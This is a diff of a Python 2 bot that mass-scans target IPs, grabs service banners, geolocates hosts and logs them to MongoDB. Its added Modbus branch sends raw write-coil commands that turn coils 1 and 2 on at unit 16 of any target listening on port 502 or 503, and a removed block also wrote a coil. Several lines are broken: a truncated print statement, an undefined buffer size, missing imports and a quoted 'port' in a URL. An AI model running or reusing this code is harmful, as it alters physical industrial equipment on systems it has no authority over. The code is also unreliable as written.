@@ -1,14 +1,12 @@
 #!/usr/bin/python
 
-import socket, urllib, sys, os, time, json
+import socket, urllib, sys, os, time, json, struct
 from pymongo import MongoClient
 from pymodbus.client.sync import ModbusTcpClient
 import snap7
 from snap7.util import *
 from bs4 import BeautifulSoup
-import config
 
-#Colores
 class colores:
     HEADER = '\033[95m'
     blue = '\033[94m'
@@ -18,57 +16,59 @@ class colores:
     normal = '\033[0m'
     BOLD = '\033[1m'
     UNDERLINE = '\033[4m'
-#Lista de puertos que escanea el bot
-totalPuertos =  len(portList)
-ip_root = ""
 
-#funcion encargada en insertar en mongoDB
+portList = [21,22,23,25,53,63,80,90,102,110,143,161,443,500,502,503,513,520,559,1434,3306,3389,5000,5050, 5060,8000,8069,8080,8081,9443,10000,27017, 28017] 
+totalPuertos =  len(portList)
+
 def insert_mongodb(IP, Country, City, regionName, ISP, Port, Banner, Latitud, Longitud, date_Insert, date_Update):
 	try:
 		client = MongoClient()
 		db = client.test
 		cursor = db.ShoditaCybercamp.insert({"ip":IP, "country": Country, "city": City, "region_name": regionName, "isp": ISP, "port": Port, "banner": Banner, "latitud": Latitud, "longitud": Longitud, "date_insert": date_Insert, "date_Update": date_Update, "bot":"Nobita"})
-		print colores.green + "[INFO] INSERT IN DB" + colores.normal
+		print colores.green + "[INFO] INSERT IN DB" + col
 	except:
 		print colores.alert + "[WARNING]ERROR INSERT MONGODB" + colores.normal
 
-#funcion encargada de obtener datos geoIP
 def geoIp(IP):
 	return urllib.urlopen("http://ip-api.com/json/" + str(IP))
 
-#parser HTML
-TAG_RE = re.compile(r'<[^>]+>')
-def remove_tags(text):
-	return TAG_RE.sub('', text)
 
-#funcion para detectar heartbleed vuln
-def scan_heartbleed(target, port):
-	url = "https://filippo.io/Heartbleed/#"
-	url_complete = url + target + ":" + port
-	html = urllib2.urlopen(url_complete).read()
-	soup = BeautifulSoup(html, "html.parser")
-	res = soup.findAll("h3",{"class":"bg-danger bleed bleed-vuln"})
-	res = str(remove_tags(res))
-	print res
-	
-#funcion que obtiene el banner
+'''Grab Banner'''
 def banner_grabbing(ip_address,port):  
 	global portList
 	try:
-		#modbus banner
 		if port == 502 or port == 503:
+			sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			sock.settimeout(10)
+			sock.connect((ip_address, 502))
+ 			print colores.blue + "[INFO] " + colores.normal + " Starting modbus scan ..."
 			try:
-				client = ModbusTcpClient(ip_address)
-				client.write_coil(1, True)
-				result = client.read_coils(1,1)
-				print result.bits[0]
-				client.close()
-				banner = "PLC"
-				return banner
+				
+				unitId = 16
+				functionCode = 5
+
+				print colores.green + "CoilID 1" + colores.normal
+				coilId = 1
+				req = struct.pack('12B', 0x00, 0x00, 0x00, 0x00, 0x00, 0x06, int(unitId), int(functionCode), 0x00, int(coilId), 0xff, 0x00)
+				sock.send(req)
+				print("TX: (%s)" %req)
+				rec = sock.recv(BUFFER_SIZE)
+				print("RX: (%s)" %rec)
+				time.sleep(2)
+ 
+				print colores.green + "CoilID 2" + colores.normal
+				coilId = 2
+				req = struct.pack('12B', 0x00, 0x00, 0x00, 0x00, 0x00, 0x06, int(unitId), int(functionCode), 0x00, int(coilId), 0xff, 0x00)
+				sock.send(req)
+				print("TX: (%s)" %req)
+				rec = sock.recv(BUFFER_SIZE)
+				print("RX: (%s)" %rec)
+				time.sleep(2)
+ 
 			except:
-				#print "502 error"
-				pass
-		#simatic banner
+				print('Closing socket')
+				sock.close()
+
 		if port == 102:
 			try:
 				plc = snap7.client.Client()
@@ -79,18 +79,16 @@ def banner_grabbing(ip_address,port):
 			except:
 				#print "102 error"
 				pass
-		#banner socket GET
+
 		if not port == 102 or port == 502 or port == 503:
 			s=socket.socket()
 			s.settimeout(5.0)
 			s.connect((ip_address,port))
 			s.send("GET HTTP/1.1 \r\n")
 			banner = s.recv(2048)  
-			print "[+]" + ip_address + ' : ' + str(port) + ' -BANNER- ' + banner + time.strftime("%H:%M:%S") + ' '
+			print colores.blue + "[+]" + ip_address + ' : ' + str(port) + ' -BANNER- ' + banner + time.strftime("%H:%M:%S") + ' ' + colores.normal
 			return banner
-			scan_heartbleed(ip_address,port)
 		else:
-			#obtener codigo web
 			try:
 				url = "http://" + ip_address + ":" + "port"
 				html = urllib2.urlopen(url).read()
@@ -114,7 +112,7 @@ def porcentaje(portID):
 
 def main():  
 	global portList, totalPuertos, ip_address
-	f = open("dic/targets.txt", "r")
+	f = open("dic/targets2.txt", "r")
 	targets = f.readlines()
 	for target in targets:
 
@@ -122,7 +120,7 @@ def main():
 		print colores.HEADER + "[INFO] Connecting to: " + ip_address + colores.normal
 		for port in portList:
 			porc = str(porcentaje(portList.index(port)))
-			print "|----[!] " + str(ip_address) + " -> " + str(port) + " " + porc + "%"
+			print colores.green + "|----[!] " + str(ip_address) + " -> " + str(port) + " " + porc + "%" + colores.normal
 			#Obtenemos el mensaje del servidor en el puerto 
 			Banner = banner_grabbing(ip_address, port)
 			#Variables obtenidas de la geoIp
